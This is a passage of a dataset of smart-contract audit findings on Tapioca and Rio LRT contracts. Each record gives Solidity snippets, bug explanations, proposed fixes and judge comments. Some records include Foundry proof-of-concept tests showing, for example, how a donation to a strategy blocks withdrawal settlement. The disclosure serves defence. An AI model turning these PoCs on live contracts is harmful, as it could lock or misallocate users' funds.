data)\n        external\n        optionNotPaused(PauseType.LeverageBuy)\n        solvent(from, false)\n        notSelf(from)\n        returns (uint256 amountOut)\n    {\n        if (address(leverageExecutor) == address(0)) {\n            revert LeverageExecutorNotValid();\n        }\n\n        // Stack too deep fix\n        _BuyCollateralCalldata memory calldata_;\n        _BuyCollateralMemoryData memory memoryData;\n        {\n            calldata_.from = from;\n            calldata_.borrowAmount = borrowAmount;\n            calldata_.supplyAmount = supplyAmount;\n            calldata_.data = data;\n        }\n\n        {\n            uint256 supplyShare = yieldBox.toShare(assetId, calldata_.supplyAmount, true);\n            if (supplyShare > 0) {\n                (memoryData.supplyShareToAmount,) =\n                    yieldBox.withdraw(assetId, calldata_.from, address(leverageExecutor), 0, supplyShare);\n            }\n        }\n\n        {\n            (, uint256 borrowShare) = _borrow(\n                calldata_.from,\n                address(this),\n                calldata_.borrowAmount,\n                _computeVariableOpeningFee(calldata_.borrowAmount)\n            );\n            (memoryData.borrowShareToAmount,) =\n                yieldBox.withdraw(assetId, address(this), address(leverageExecutor), 0, borrowShare);\n        }\n        {\n            amountOut = leverageExecutor.getCollateral(\n                collateralId,\n                address(asset),\n                address(collateral),\n                memoryData.supplyShareToAmount + memoryData.borrowShareToAmount,\n              calldata_.from,\n                calldata_.data\n            );\n        }\n        uint256 collateralShare = yieldBox.toShare(collateralId, amountOut, false);\n      address(asset).safeApprove(address(yieldBox), type(uint256).max);\n      yieldBox.depositAsset(collateralId, address(this), address(this), 0, collateralShare); // TODO Check for rounding attack?\n      address(asset).safeApprove(address(yieldBox), 0);\n\n        if (collateralShare == 0) revert CollateralShareNotValid();\n        _allowedBorrow(calldata_.from, collateralShare);\n        _addCollateral(calldata_.from, calldata_.from, false, 0, collateralShare);\n    }\n```\n\nThe code above has several issues:\n`leverageExecutor.getCollateral()` receiver should be `address(this)`. ---> for 2th step deposit to YB\n`address(asset).safeApprove()` should use `address(collateral).safeApprove()`.\n`yieldBox.depositAsset()` receiver should be `calldata_.from`. ----> for next execute addCollateral(calldata.from)ч```\n    function buyCollateral(address from, uint256 borrowAmount, uint256 supplyAmount, bytes calldata data)\n        external\n        optionNotPaused(PauseType.LeverageBuy)\n        solvent(from, false)\n        notSelf(from)\n        returns (uint256 amountOut)\n    {\n// rest of code.\n\n        {\n            (, uint256 borrowShare) = _borrow(\n                calldata_.from,\n                address(this),\n                calldata_.borrowAmount,\n                _computeVariableOpeningFee(calldata_.borrowAmount)\n            );\n            (memoryData.borrowShareToAmount,) =\n                yieldBox.withdraw(assetId, address(this), address(leverageExecutor), 0, borrowShare);\n        }\n        {\n            amountOut = leverageExecutor.getCollateral(\n                collateralId,\n                address(asset),\n                address(collateral),\n                memoryData.supplyShareToAmount // Add the line below\n memoryData.borrowShareToAmount,\n// Remove the line below\n               calldata_.from,\n// Add the line below\n               address(this),\n                calldata_.data\n            );\n        }\n        uint256 collateralShare = yieldBox.toShare(collateralId, amountOut, false);\n// Remove the line below\n       address(asset).safeApprove(address(yieldBox), type(uint256).max);\n// Remove the line below\n       yieldBox.depositAsset(collateralId, address(this), address(this), 0, collateralShare); // TODO Check for rounding attack?\n// Remove the line below\n       address(asset).safeApprove(address(yieldBox), 0);\n// Add the line below\n       address(collateral).safeApprove(address(yieldBox), type(uint256).max);\n// Add the line below\n       yieldBox.depositAsset(collateralId, address(this), calldata_.from, 0, collateralShare);\n// Add the line below\n       address(collateral).safeApprove(address(yieldBox), 0);\n\n        if (collateralShare == 0) revert CollateralShareNotValid();\n        _allowedBorrow(calldata_.from, collateralShare);\n        _addCollateral(calldata_.from, calldata_.from, false, 0, collateralShare);\n    }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nWangAudit commented:\nAccording to ILeverageExecutor (interface for the leverageExecutor contract) this parameter should indeed by address from which is calldata_.from; therefore; I assume everything is in place as it should be. For second point; as I understand safeApprove is called correctly; the problem is that we should deposit asset; not collateral; As I udnerstand; the 3rd point also works correct as intended\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/359.ч`buyCollateral()` does not work properly.\nCode Snippet\nTool used\nManual Review
Not properly tracking debt accrual leads mintOpenInterestDebt() to lose twTap rewardsчmediumч```\nfunction mintOpenInterestDebt(address twTap) external onlyOwner { \n        uint256 usdoSupply = usdoToken.totalSupply();\n\n        // nothing to mint when there's no activity\n        if (usdoSupply > 0) {  \n            // re-compute latest debt\n            uint256 totalUsdoDebt = computeTotalDebt();  \n   \n            //add Origins debt \n            //Origins market doesn't accrue in time but increases totalSupply\n            //and needs to be taken into account here\n            uint256 len = allOriginsMarkets.length;\n            for (uint256 i; i < len; i++) {\n                IMarket market = IMarket(allOriginsMarkets[i]);\n                if (isOriginRegistered[address(market)]) {\n                    (uint256 elastic,) = market.totalBorrow();\n                    totalUsdoDebt += elastic;\n                }\n            }\n \n            //debt should always be > USDO supply\n            if (totalUsdoDebt > usdoSupply) { \n                uint256 _amount = totalUsdoDebt - usdoSupply;\n\n                //mint against the open interest; supply should be fully minted now\n                IUsdo(address(usdoToken)).mint(address(this), _amount);\n\n                //send it to twTap\n                uint256 rewardTokenId = ITwTap(twTap).rewardTokenIndex(address(usdoToken));\n                _distributeOnTwTap(_amount, rewardTokenId, address(usdoToken), ITwTap(twTap));\n            }\n        } \n    }\n```\nчDebt accrual is tracked wrongly, making the expected twTap rewards to be potentially lost.\nPenrose’s `mintOpenInterestDebt()` function allows USDO to be minted and distributed as a reward to twTap holders based on the current USDO open interest.\nIn order to mint and distribute rewards, `mintOpenInterestDebt()` will perform the following steps:\nQuery the current `USDO.supply()`\nCompute the total debt from all the markets (Origins included)\nIf `totalUsdoDebt > usdoSupply`, then distribute the difference among the twTap holders\n```\nfunction mintOpenInterestDebt(address twTap) external onlyOwner { \n        uint256 usdoSupply = usdoToken.totalSupply();\n\n        // nothing to mint when there's no activity\n        if (usdoSupply > 0) {  \n            // re-compute latest debt\n            uint256 totalUsdoDebt = computeTotalDebt();  \n   \n            //add Origins debt \n            //Origins market doesn't accrue in time but increases totalSupply\n            //and needs to be taken into account here\n            uint256 len = allOriginsMarkets.length;\n            for (uint256 i; i < len; i++) {\n                IMarket market = IMarket(allOriginsMarkets[i]);\n                if (isOriginRegistered[address(market)]) {\n                    (uint256 elastic,) = market.totalBorrow();\n                    totalUsdoDebt += elastic;\n                }\n            }\n \n            //debt should always be > USDO supply\n            if (totalUsdoDebt > usdoSupply) { \n                uint256 _amount = totalUsdoDebt - usdoSupply;\n\n                //mint against the open interest; supply should be fully minted now\n                IUsdo(address(usdoToken)).mint(address(this), _amount);\n\n                //send it to twTap\n                uint256 rewardTokenId = ITwTap(twTap).rewardTokenIndex(address(usdoToken));\n                _distributeOnTwTap(_amount, rewardTokenId, address(usdoToken), ITwTap(twTap));\n            }\n        } \n    }\n```\n\nThis approach has two main issues that make the current reward distribution malfunction:\nBecause debt is not actually tracked and is instead directly queried from the current total borrows via `computeTotalDebt()`, if users repay their debt prior to a reward distribution this debt won’t be considered for the fees, given that fees will always be calculated considering the current `totalUsdoDebt` and `usdoSupply`.\nBridging USDO is not considered\nIf USDO is bridged from another chain to the current chain, then the `usdoToken.totalSupply()` will increment but the `totalUsdoDebt()` won’t. This will make rewards never be distributed because `usdoSupply` will always be greater than `totalUsdoDebt`.\nOn the other hand, if USDO is bridged from the current chain to another chain, the `usdoToken.totalSupply()` will decrement and tokens will be burnt, while `totalUsdoDebt()` will remain the same. This will make more rewards than the expected ones to be distributed because `usdoSupply` will be way smaller than `totalUsdoDebt`.\nConsider the following scenario: 1000 USDO are borrowed, and already 50 USDO have been accrued as debt.\nThis makes USDO’s totalSupply() to be 1000, while `totalUsdoDebt` be 1050 USDO. If `mintOpenInterestDebt()` is called, 50 USDO should be minted and distributed among twTap holders.\nHowever, prior to executing `mintOpenInterestDebt()`, a user bridges 100 USDO from chain B, making the total supply increment from 1000 USDO to 1100 USDO. Now, totalSupply() is 1100 USDO, while `totalUsdoDebt` is still 1050, making rewards not be distributed among users because `totalUsdoDebt < usdoSupply`.ч"
`TOFTMarketReceiverModule::marketBorrowReceiver` flow is brokenчmediumч```\n    function _extractTokens(address _from, address _token, uint256 _amount) internal returns (uint256) {\n        uint256 balanceBefore = IERC20(_token).balanceOf(address(this));\n        // IERC20(_token).safeTransferFrom(_from, address(this), _amount);\n        pearlmit.transferFromERC20(_from, address(this), address(_token), _amount);\n        uint256 balanceAfter = IERC20(_token).balanceOf(address(this));\n        if (balanceAfter <= balanceBefore) revert Magnetar_ExtractTokenFail();\n        return balanceAfter - balanceBefore;\n    }\n```\nчThe `TOFTMarketReceiverModule::marketBorrowReceiver` flow is broken and will revert when the Magnetar contract tries to transfer the ERC1155 tokens to the Market contract.\n`TOFTMarketReceiverModule::marketBorrowReceiver` flow is broken.\nLet's examine it more closely:\nAfter checking the whitelisting status for the `marketHelper`, `magnetar` and the `market` contracts an approval is made to the Magnetar contract.\n`MagnetarCollateralModule::depositAddCollateralAndBorrowFromMarket` get called with the passed parameters.\nIf the `data.deposit` is true, the Magnetar contract will call `_extractTokens` with the following params: `from = msg_.user`, `token = collateralAddress` and `amount = msg_.collateralAmount`.\n```\n    function _extractTokens(address _from, address _token, uint256 _amount) internal returns (uint256) {\n        uint256 balanceBefore = IERC20(_token).balanceOf(address(this));\n        // IERC20(_token).safeTransferFrom(_from, address(this), _amount);\n        pearlmit.transferFromERC20(_from, address(this), address(_token), _amount);\n        uint256 balanceAfter = IERC20(_token).balanceOf(address(this));\n        if (balanceAfter <= balanceBefore) revert Magnetar_ExtractTokenFail();\n        return balanceAfter - balanceBefore;\n    }\n```\n\nThe collateral gets transferred into the Magnetar contract in case the `msg._user` has given sufficient allowance to the Magnetar contract through the Pearlmit contract.\nAfter this `_setApprovalForYieldBox(data.market, yieldBox_);` is called that sets the allowance of the Magnetar contract to the Market contract.\nThen `addCollateral` is called on the Market contract. I've inlined the internal function to make it easier to follow:\n```\n    function _addCollateral(address from, address to, bool skim, uint256 amount, uint256 share) internal {\n        if (share == 0) {\n            share = yieldBox.toShare(collateralId, amount, false);\n        }\n        uint256 oldTotalCollateralShare = totalCollateralShare;\n        userCollateralShare[to] += share;\n        totalCollateralShare = oldTotalCollateralShare + share;\n\n        // yieldBox.transfer(from, address(this), _assetId, share);\n        bool isErr = pearlmit.transferFromERC1155(from, address(this), address(yieldBox), collateralId, share);\n        if (isErr) {\n            revert TransferFailed();\n        }\n    }\n```\n\nAfter the `userCollateralShare` mapping is updated `pearlmit.transferFromERC1155(from, address(this), address(yieldBox), collateralId, share);` gets called.\nThis is critical as now the Magnetar is supposed to transfer the ERC1155 tokens(Yieldbox) to the Market contract.\nIn order to do this the Magnetar contract should have given the allowance to the Market contract through the Pearlmit contract.\nThis is not the case, the Magnetar has only executed `_setApprovalForYieldBox(data.market, yieldBox_);`, nothing else.\nIt will revert inside the Pearlmit contract `transferFromERC1155` function when the allowance is being checked.\nOther occurrences\n`TOFT::mintLendXChainSGLXChainLockAndParticipateReceiver` has a similar issue as:\nExtract the bbCollateral from the user, sets approval for the BigBang contract through YieldBox.\nBut then inside the `BBCollateral::addCollateral` the `_addTokens` again expects an allowance through the Pearlmit contract.\n`TOFT::lockAndParticipateReceiver` calls the `Magnetar:lockAndParticipate` where:\nThe same issue where approval through the Pearlmit contract is expected.ч
Blacklisted accounts can still transact.чmediumч```\n/**\n * @notice Overrides Blacklist function to transfer balance of a blacklisted user to the caller.\n * @dev This function is called internally when an account is blacklisted.\n * @param user The blacklisted user whose balance will be transferred.\n */\nfunction _onceBlacklisted(address user) internal override {\n  _transfer(user, _msgSender(), balanceOf(user));\n}\n```\nчAccounts that have been blacklisted by the `BLACKLISTER_ROLE` continue to transact normally.\nCurrently, the only real effect of blacklisting an account is the seizure of `Stablecoin` funds:\n```\n/**\n * @notice Overrides Blacklist function to transfer balance of a blacklisted user to the caller.\n * @dev This function is called internally when an account is blacklisted.\n * @param user The blacklisted user whose balance will be transferred.\n */\nfunction _onceBlacklisted(address user) internal override {\n  _transfer(user, _msgSender(), balanceOf(user));\n}\n```\n\nHowever, following a call to `addBlackList(address)`, the blacklisted account may continue to transact using `Stablecoin`.\nCombined with previous audit reports, which attest to the blacklist function's susceptibility to frontrunning, the current implementation of the blacklist operation can effectively be considered a no-op.ч
Setting the strategy cap to ""0"" does not update the total shares held or the withdrawal queue"чhighч"```\nfunction setOperatorStrategyCap(\n        RioLRTOperatorRegistryStorageV1.StorageV1 storage s,\n        uint8 operatorId,\n        IRioLRTOperatorRegistry.StrategyShareCap memory newShareCap\n    ) internal {\n        . \n        // @review this ""if"" will be executed\n        -> if (currentShareDetails.cap > 0 && newShareCap.cap == 0) {\n            // If the operator has allocations, queue them for exit.\n            if (currentShareDetails.allocation > 0) {\n                -> operatorDetails.queueOperatorStrategyExit(operatorId, newShareCap.strategy);\n            }\n            // Remove the operator from the utilization heap.\n            utilizationHeap.removeByID(operatorId);\n        } else if (currentShareDetails.cap == 0 && newShareCap.cap > 0) {\n            // If the current cap is 0 and the new cap is greater than 0, insert the operator into the heap.\n            utilizationHeap.insert(OperatorUtilizationHeap.Operator(operatorId, 0));\n        } else {\n            // Otherwise, update the operator's utilization in the heap.\n            utilizationHeap.updateUtilizationByID(operatorId, currentShareDetails.allocation.divWad(newShareCap.cap));\n        }\n        .\n    }\n```\n"ч"Removing or setting the strategy cap to 0 will not decrease the shares held in the system. Additionally, it will not update the withdrawal queue, which means users can request withdrawals, and the withdrawals will exceed the allocated amount when rebalance occurs.\nLet's go over the issue with an example:\nAssume there is 1 strategy and 2 operators active in an LSR with total strategy shares holding is 1000 * 1e18 where both operators shares 500-500 the assets.\nWhen the owner decides to inactivate or just simply sets one of the operators cap to ""0"" the operator will withdraw all its assets as follows:\n```\nfunction setOperatorStrategyCap(\n        RioLRTOperatorRegistryStorageV1.StorageV1 storage s,\n        uint8 operatorId,\n        IRioLRTOperatorRegistry.StrategyShareCap memory newShareCap\n    ) internal {\n        . \n        // @review this ""if"" will be executed\n        -> if (currentShareDetails.cap > 0 && newShareCap.cap == 0) {\n            // If the operator has allocations, queue them for exit.\n            if (currentShareDetails.allocation > 0) {\n                -> operatorDetails.queueOperatorStrategyExit(operatorId, newShareCap.strategy);\n            }\n            // Remove the operator from the utilization heap.\n            utilizationHeap.removeByID(operatorId);\n        } else if (currentShareDetails.cap == 0 && newShareCap.cap > 0) {\n            // If the current cap is 0 and the new cap is greater than 0, insert the operator into the heap.\n            utilizationHeap.insert(OperatorUtilizationHeap.Operator(operatorId, 0));\n        } else {\n            // Otherwise, update the operator's utilization in the heap.\n            utilizationHeap.updateUtilizationByID(operatorId, currentShareDetails.allocation.divWad(newShareCap.cap));\n        }\n        .\n    }\n```\n\n```\nfunction queueOperatorStrategyExit(IRioLRTOperatorRegistry.OperatorDetails storage operator, uint8 operatorId, address strategy) internal {\n        .\n        // @review asks delegator to exit\n        -> bytes32 withdrawalRoot = delegator.queueWithdrawalForOperatorExit(strategy, sharesToExit);\n        emit IRioLRTOperatorRegistry.OperatorStrategyExitQueued(operatorId, strategy, sharesToExit, withdrawalRoot);\n    }\n```\n\nThen the operator delegator contract calls the EigenLayer to withdraw all its balance as follows:\n```\nfunction _queueWithdrawalForOperatorExitOrScrape(address strategy, uint256 shares) internal returns (bytes32 root) {\n       . // @review jumps to internal function\n        -> root = _queueWithdrawal(strategy, shares, address(depositPool()));\n    }\n\nfunction _queueWithdrawal(address strategy, uint256 shares, address withdrawer) internal returns (bytes32 root) {\n        IDelegationManager.QueuedWithdrawalParams[] memory withdrawalParams = new IDelegationManager.QueuedWithdrawalParams[](1);\n        withdrawalParams[0] = IDelegationManager.QueuedWithdrawalParams({\n            strategies: strategy.toArray(),\n            shares: shares.toArray(),\n            withdrawer: withdrawer\n        });\n        // @review calls Eigen layer to queue all the balance and returns the root\n        -> root = delegationManager.queueWithdrawals(withdrawalParams)[0];\n    }\n```\n\nWhich we can observe from the above snippet the EigenLayer is called for the withdrawal and then the entire function execution ends. The problem is `assetRegistry` still thinks there are 1000 * 1e18 EigenLayer shares in the operators. Also, the `withdrawalQueue` is not aware of this withdrawal request which means that users can call `requestWithdrawal` to withdraw up to 1000 * 1e18 EigenLayer shares worth LRT but in reality the 500 * 1e18 portion of it already queued in withdrawal by the owner of operator registry.\nCoded PoC:\n```\nfunction test_SettingStrategyCapZero_WithdrawalsAreDoubleCountable() public {\n        IRioLRTOperatorRegistry.StrategyShareCap[] memory zeroStrategyShareCaps =\n            new IRioLRTOperatorRegistry.StrategyShareCap[](2);\n        zeroStrategyShareCaps[0] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: RETH_STRATEGY, cap: 0});\n        zeroStrategyShareCaps[1] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: CBETH_STRATEGY, cap: 0});\n\n        uint8 operatorId = addOperatorDelegator(reLST.operatorRegistry, address(reLST.rewardDistributor));\n\n        uint256 AMOUNT = 111e18;\n\n        // Allocate to cbETH strategy.\n        cbETH.approve(address(reLST.coordinator), type(uint256).max);\n        uint256 lrtAmount = reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);\n\n        // Push funds into EigenLayer.\n        vm.prank(EOA, EOA);\n        reLST.coordinator.rebalance(CBETH_ADDRESS);\n\n        vm.recordLogs();\n        reLST.operatorRegistry.setOperatorStrategyShareCaps(operatorId, zeroStrategyShareCaps);\n\n        Vm.Log[] memory entries = vm.getRecordedLogs();\n        assertGt(entries.length, 0);\n\n        for (uint256 i = 0; i < entries.length; i++) {\n            if (entries[i].topics[0] == keccak256('OperatorStrategyExitQueued(uint8,address,uint256,bytes32)')) {\n                uint8 emittedOperatorId = abi.decode(abi.encodePacked(entries[i].topics[1]), (uint8));\n                (address strategy, uint256 sharesToExit, bytes32 withdrawalRoot) =\n                    abi.decode(entries[i].data, (address, uint256, bytes32));\n\n                assertEq(emittedOperatorId, operatorId);\n                assertEq(strategy, CBETH_STRATEGY);\n                assertEq(sharesToExit, AMOUNT);\n                assertNotEq(withdrawalRoot, bytes32(0));\n\n                break;\n            }\n            if (i == entries.length - 1) fail('Event not found');\n        }\n\n        // @review add these\n        // @review all the eigen layer shares are already queued as we checked above, now user requestWithdrawal\n        // of the same amount of EigenLayer share worth of LRT which there will be double counting when epoch is settled.\n        uint256 queuedShares = reLST.coordinator.requestWithdrawal(address(cbETH), lrtAmount);\n        console.log(""Queued shares"", queuedShares);\n    }\n```\n"ч"
swapValidatorDetails incorrectly writes keys to memory, resulting in permanently locked beacon chain depositsчhighч```\n// Swap the position of the validators starting from the `fromIndex` with the validators that were next in line to be exited.\nVALIDATOR_DETAILS_POSITION.swapValidatorDetails(operatorId, fromIndex, validators.exited, validatorCount);\n```\nчWhen loading BLS public keys from storage to memory, the keys are partly overwritten with zero bytes. This ultimately causes allocations of these malformed public keys to permanently lock deposited ETH in the beacon chain deposit contract.\nValidatorDetails.swapValidatorDetails is used by RioLRTOperatorRegistry.reportOutOfOrderValidatorExits to swap the details in storage of validators which have been exited out of order:\n```\n// Swap the position of the validators starting from the `fromIndex` with the validators that were next in line to be exited.\nVALIDATOR_DETAILS_POSITION.swapValidatorDetails(operatorId, fromIndex, validators.exited, validatorCount);\n```\n\nIn swapValidatorDetails, for each swap to occur, we load two keys into memory from storage:\n```\nkeyOffset1 = position.computeStorageKeyOffset(operatorId, startIndex1);\nkeyOffset2 = position.computeStorageKeyOffset(operatorId, startIndex2);\nassembly {\n    // Load key1 into memory\n    let _part1 := sload(keyOffset1) // Load bytes 0..31\n    let _part2 := sload(add(keyOffset1, 1)) // Load bytes 32..47\n    mstore(add(key1, 0x20), _part1) // Store bytes 0..31\n    mstore(add(key1, 0x30), shr(128, _part2)) // Store bytes 16..47\n\n    isEmpty := iszero(or(_part1, _part2)) // Store if key1 is empty\n\n    // Load key2 into memory\n    _part1 := sload(keyOffset2) // Load bytes 0..31\n    _part2 := sload(add(keyOffset2, 1)) // Load bytes 32..47\n    mstore(add(key2, 0x20), _part1) // Store bytes 0..31\n    mstore(add(key2, 0x30), shr(128, _part2)) // Store bytes 16..47\n\n    isEmpty := or(isEmpty, iszero(or(_part1, _part2))) // Store if key1 or key2 is empty\n}\n```\n\nThe problem here is that when we store the keys in memory, they don't end up as intended. Let's look at how it works to see where it goes wrong.\nThe keys used here are BLS public keys, with a length of 48 bytes, e.g.: `0x95cfcb859956953f9834f8b14cdaa939e472a2b5d0471addbe490b97ed99c6eb8af94bc3ba4d4bfa93d087d522e4b78d`. As such, previously to entering this for loop, we initialize key1 and key2 in memory as 48 byte arrays:\n```\nbytes memory key1 = new bytes(48);\nbytes memory key2 = new bytes(48);\n```\n\nSince they're longer than 32 bytes, they have to be stored in two separate storage slots, thus we do two sloads per key to retrieve `_part1` and `_part2`, containing the first 32 bytes and the last 16 bytes respectively.\nThe following lines are used with the intention of storing the key in two separate memory slots, similarly to how they're stored in storage:\n```\nmstore(add(key1, 0x20), _part1) // Store bytes 0..31\nmstore(add(key1, 0x30), shr(128, _part2)) // Store bytes 16..47\n```\n\nThe problem however is that the second mstore shifts `_part2` 128 bits to the right, causing the leftmost 128 bits to zeroed. Since this mstore is applied only 16 (0x10) bytes after the first mstore, we overwrite bytes 16..31 with zero bytes. We can test this in chisel to prove it:\nUsing this example key: `0x95cfcb859956953f9834f8b14cdaa939e472a2b5d0471addbe490b97ed99c6eb8af94bc3ba4d4bfa93d087d522e4b78d`\nWe assign the first 32 bytes to _part1:\n```\nbytes32 _part1 = 0x95cfcb859956953f9834f8b14cdaa939e472a2b5d0471addbe490b97ed99c6eb\n```\n\nWe assign the last 16 bytes to _part2:\n```\nbytes32 _part2 = bytes32(bytes16(0x8af94bc3ba4d4bfa93d087d522e4b78d))\n```\n\nWe assign 48 bytes in memory for key1:\n```\nbytes memory key1 = new bytes(48);\n```\n\nAnd we run the following snippet from swapValidatorDetails in chisel:\n```\nassembly {\n  mstore(add(key1, 0x20), _part1) // Store bytes 0..31\n  mstore(add(key1, 0x30), shr(128, _part2)) // Store bytes 16..47\n}\n```\n\nNow we can check the resulting memory using `!memdump`, which outputs the following:\n```\n➜ !memdump\n[0x00:0x20]: 0x0000000000000000000000000000000000000000000000000000000000000000\n[0x20:0x40]: 0x0000000000000000000000000000000000000000000000000000000000000000\n[0x40:0x60]: 0x00000000000000000000000000000000000000000000000000000000000000e0\n[0x60:0x80]: 0x0000000000000000000000000000000000000000000000000000000000000000\n[0x80:0xa0]: 0x0000000000000000000000000000000000000000000000000000000000000030\n[0xa0:0xc0]: 0x95cfcb859956953f9834f8b14cdaa93900000000000000000000000000000000\n[0xc0:0xe0]: 0x8af94bc3ba4d4bfa93d087d522e4b78d00000000000000000000000000000000\n```\n\nWe can see from the memory that at the free memory pointer, the length of key1 is defined 48 bytes (0x30), and following it is the resulting key with 16 bytes zeroed in the middle of the key.ч
Requested withdrawal can be impossible to settle due to EigenLayer shares value appreciate when there are idle funds in deposit poolчhighч"```\n // forge test --match-contract RioLRTDepositPoolTest --match-test test_InsufficientSharesInWithdrawal -vv\n    function test_InsufficientSharesInWithdrawal() public {\n        uint8 operatorId = addOperatorDelegator(reLST.operatorRegistry, address(reLST.rewardDistributor));\n        address operatorDelegator = reLST.operatorRegistry.getOperatorDetails(operatorId).delegator;\n\n        uint256 AMOUNT = 5e18;\n\n        // Allocate to cbETH strategy.\n        cbETH.approve(address(reLST.coordinator), type(uint256).max);\n        reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);\n        console.log(""SHARES HELD"", reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS));\n\n        // Push funds into EigenLayer.\n        vm.prank(EOA, EOA);\n        reLST.coordinator.rebalance(CBETH_ADDRESS);\n\n        assertEq(cbETH.balanceOf(address(reLST.depositPool)), 0);\n        assertEq(reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS), AMOUNT);\n        console.log(""SHARES HELD"", reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS));\n\n        // @review before rebalance, deposit 100 * 1e18\n        reLST.coordinator.deposit(CBETH_ADDRESS, 100e18);\n\n        // @review request withdrawal \n        reLST.coordinator.requestWithdrawal(CBETH_ADDRESS, 100e18);\n        console.log(""SHARES HELD"", reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS));\n\n        // @review donate, the idea is to make EigenLayer shares worth more\n        uint256 donate = 10_000 * 1e18;\n        address tapir = address(69);\n        MockERC20(CBETH_ADDRESS).mint(tapir, donate);\n        console.log(""before rate"", reLST.assetRegistry.convertFromSharesToAsset(address(cbETHStrategy), 1e18));\n\n        // @review expecting the rate to be higher after donation\n        vm.prank(tapir);\n        MockERC20(CBETH_ADDRESS).transfer(address(cbETHStrategy), donate);\n        console.log(""after rate"", reLST.assetRegistry.convertFromSharesToAsset(address(cbETHStrategy), 1e18));\n\n        // @review rebalance, expect revert\n        skip(reLST.coordinator.rebalanceDelay());\n        vm.startPrank(EOA, EOA);\n        vm.expectRevert(bytes4(keccak256(""INCORRECT_NUMBER_OF_SHARES_QUEUED()"")));\n        reLST.coordinator.rebalance(CBETH_ADDRESS);\n        vm.stopPrank();\n    }\n```\n"ч"When users request a withdrawal, the EigenLayer shares equivalent to their LRT's value are recorded. During settlement, these EigenLayer shares must be deducted to finalize the withdrawal epoch. However, in certain scenarios, the requested EigenLayer shares may be impossible to unwind due to funds idling in the deposit pool.\nLet's assume that 1 LRT equals 1 EigenLayer-cbETH, which equals 1 cbETH initially.\nAlice deposits 5e18 cbETH, and her deposits are allocated to operators after rebalancing. Now, Rio holds 5 EigenLayer-cbETH, which is worth 5 cbETH.\nAfter some time, Bob deposits 100e18 cbETH to Rio and immediately withdraws it. At the time Bob requests this withdrawal, 100 cbETH is worth 100 EigenLayer-cbETH, so the shares owed are 100 EigenLayer-cbETH. At settlement, 100 EigenLayer-cbETH worth of cbETH has to be sent to the withdrawal queue to settle this epoch.\nNow, assume that the value of EigenLayer-cbETH increases, meaning that 1 EigenLayer-cbETH is now worth more cbETH. This is an expected behavior because EigenLayer-cbETH is similar to an ERC4626 vault, and we expect its value to increase over time.\nLet's say 1 EigenLayer-cbETH is now worth 1.1 cbETH.\nNow, 100 cbETH sits idle in the deposit pool, and there are 5 EigenLayer-cbETH in the operators, which means there are a total of 90.9 + 5 = 95.9 EigenLayer-cbETH worth of cbETH in Rio. However, Bob's withdrawal request is for 100 EigenLayer-cbETH.\nThis would mean that Bob's withdrawal request will not be settled, and the entire withdrawal flow will be stuck because this epoch can't be settled.\nCoded PoC:\n```\n // forge test --match-contract RioLRTDepositPoolTest --match-test test_InsufficientSharesInWithdrawal -vv\n    function test_InsufficientSharesInWithdrawal() public {\n        uint8 operatorId = addOperatorDelegator(reLST.operatorRegistry, address(reLST.rewardDistributor));\n        address operatorDelegator = reLST.operatorRegistry.getOperatorDetails(operatorId).delegator;\n\n        uint256 AMOUNT = 5e18;\n\n        // Allocate to cbETH strategy.\n        cbETH.approve(address(reLST.coordinator), type(uint256).max);\n        reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);\n        console.log(""SHARES HELD"", reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS));\n\n        // Push funds into EigenLayer.\n        vm.prank(EOA, EOA);\n        reLST.coordinator.rebalance(CBETH_ADDRESS);\n\n        assertEq(cbETH.balanceOf(address(reLST.depositPool)), 0);\n        assertEq(reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS), AMOUNT);\n        console.log(""SHARES HELD"", reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS));\n\n        // @review before rebalance, deposit 100 * 1e18\n        reLST.coordinator.deposit(CBETH_ADDRESS, 100e18);\n\n        // @review request withdrawal \n        reLST.coordinator.requestWithdrawal(CBETH_ADDRESS, 100e18);\n        console.log(""SHARES HELD"", reLST.assetRegistry.getAssetSharesHeld(CBETH_ADDRESS));\n\n        // @review donate, the idea is to make EigenLayer shares worth more\n        uint256 donate = 10_000 * 1e18;\n        address tapir = address(69);\n        MockERC20(CBETH_ADDRESS).mint(tapir, donate);\n        console.log(""before rate"", reLST.assetRegistry.convertFromSharesToAsset(address(cbETHStrategy), 1e18));\n\n        // @review expecting the rate to be higher after donation\n        vm.prank(tapir);\n        MockERC20(CBETH_ADDRESS).transfer(address(cbETHStrategy), donate);\n        console.log(""after rate"", reLST.assetRegistry.convertFromSharesToAsset(address(cbETHStrategy), 1e18));\n\n        // @review rebalance, expect revert\n        skip(reLST.coordinator.rebalanceDelay());\n        vm.startPrank(EOA, EOA);\n        vm.expectRevert(bytes4(keccak256(""INCORRECT_NUMBER_OF_SHARES_QUEUED()"")));\n        reLST.coordinator.rebalance(CBETH_ADDRESS);\n        vm.stopPrank();\n    }\n```\n"чDiscussion\nsolimander\nSeems unlikely to have a meaningful effect while rebasing tokens are not supported.\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/rio-org/rio-sherlock-audit/pull/13\nCzar102\nFor a more severe impact, see #112.чHigh since the further and current withdrawals are not possible.\nCode Snippet\nTool used\nManual Review
